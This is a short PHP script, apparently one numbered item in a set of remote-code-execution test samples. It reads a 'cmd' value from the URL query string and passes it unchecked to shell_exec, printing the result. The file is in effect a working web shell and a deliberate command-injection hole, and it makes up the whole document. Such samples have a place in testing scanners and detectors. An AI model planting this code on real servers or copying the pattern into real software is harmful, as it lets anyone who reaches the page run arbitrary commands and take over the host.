<?php
// RCE test variation #866
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>